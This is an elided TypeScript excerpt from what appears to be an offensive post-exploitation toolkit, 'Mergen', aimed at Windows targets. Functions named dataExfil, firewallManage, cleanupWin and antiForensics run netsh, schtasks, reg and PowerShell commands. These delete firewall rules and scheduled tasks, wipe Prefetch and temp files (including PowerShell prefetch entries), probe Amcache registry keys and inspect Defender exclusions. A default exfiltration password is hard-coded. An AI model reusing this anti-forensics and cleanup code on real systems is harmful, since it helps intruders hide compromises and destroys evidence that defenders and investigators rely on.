...
export async function dataExfil(args: string[], timeout: number): Promise<HookResult> {
  ...
  const password = argVal(args, "--password") || "mergen"
  const findings: Finding[] = []
...
export async function firewallManage(args: string[], timeout: number): Promise<HookResult> {
  ...
  if (activeExec === "cmd" || activeExec === "bat") {
    if (action === "enum") {
      ...
      const csRules = rules.stdout.split("\n").filter((l) => l.includes("Mergen") || l.includes("cs-"))
      if (csRules.length > 0) {
        output.push("\n[!] Mergen rules found:")
    ...
    if (action === "restore") {
      ...
      const delRules = await cmd(
        'netsh advfirewall firewall delete rule name=all dir=in action=allow | findstr /i "cs- mergen"',
        timeout,
      )
...
Write-Output ""
Write-Output "[*] Removing Mergen firewall rules..."
...
Write-Output "[*] Removed $removed Mergen rules"
...
`
    ...
    findings.push({
      ...
      title: "Firewall profiles restored, Mergen rules removed, port proxies cleared",
      details: r.stdout.substring(0, 500),
...
export async function cleanupWin(_args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["[*] Cleaning up Mergen artifacts from Windows target...\n"]
  let cleaned = 0
  ...
  if (activeExec === "cmd" || activeExec === "bat") {
    ...
    const tasks = await cmd('schtasks /query /fo csv 2>nul | findstr /i "cs- mergen"', timeout)
    ...
    await cmd('del /q /s "%TEMP%\\mergen-*" 2>nul', timeout)
    output.push("[+] Cleaned temp files (cs-*, mergen-*)")
    cleaned++
    await cmd('del /q "C:\\Windows\\Prefetch\\*MERGEN*" 2>nul', timeout)
    await cmd('del /q "C:\\Windows\\Prefetch\\*CS-*" 2>nul', timeout)
    output.push("[+] Cleared prefetch entries")
    cleaned++
    const fwRules = await cmd('netsh advfirewall firewall show rule name=all | findstr /i "cs- mergen"', timeout)
  ...
  const tasks = await ps(
    `Get-ScheduledTask | Where-Object { $_.TaskName -like 'cs-*' -or $_.TaskName -like '*mergen*' } | ForEach-Object { Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false; Write-Output $_.TaskName }`,
    timeout,
  )
...
$csExclusions = $prefs.ExclusionPath | Where-Object { $_ -like '*cs-*' -or $_ -like '*mergen*' }
...
`,
  ...
  const prefetch = await ps(
    `Remove-Item "C:\\Windows\\Prefetch\\*mergen*" -Force -ErrorAction SilentlyContinue; Remove-Item "C:\\Windows\\Prefetch\\*CS-*" -Force -ErrorAction SilentlyContinue`,
    timeout,
  )
...
export async function antiForensics(args: string[], timeout: number): Promise<HookResult> {
  ...
  if (activeExec === "cmd" || activeExec === "bat") {
    ...
    if (action === "prefetch" || action === "full") {
      ...
      output.push("[+] Cleared suspicious prefetch entries (mergen, cs-, powershell)")
    }
    if (action === "amcache" || action === "full") {
      ...
      const amcache = await cmd(
        'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AppModel\\StateRepository\\Cache\\Application" /s 2>nul | findstr /i "mergen cs-"',
        timeout,
      )
      if (amcache.stdout.trim()) {
        output.push("[!] Mergen references found in registry:")
